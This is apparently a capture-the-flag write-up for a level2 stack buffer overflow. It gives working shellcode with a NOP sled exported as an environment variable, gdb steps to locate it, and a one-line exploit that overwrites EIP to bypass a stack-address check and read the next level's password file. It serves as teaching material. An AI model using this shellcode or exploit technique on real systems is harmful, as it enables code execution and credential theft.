By checking the binary, we can observe that this time the function p is called
properly from the main. We have yet another static buffer that we can overflow.
The trick here is that after the overflow, there is a cmp to check if we're
making the EIP point to an address on the stack (cmp 0xb0000000). In order to
make this exploit work, we first export a shellcode into an environment variable
Shellcode: http://shell-storm.org/shellcode/files/shellcode-216.php.

export SHELLCODE=`python -c 'print "\x90"*100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/level3/.pass;exit;"'`

Then we're pointing the EIP to a function that will be called by the binary, like gets or printf, and just after that we inject the shellcode address. We can find the shellcode address by using the x/ call on ebp.

break main
run
x/1024x $ebp

Finally, the epxloit: python -c 'print "a"*80 + "\xc0\x83\x04\x08" + "\xb8\xf7\xff\xbf"' | ./level2
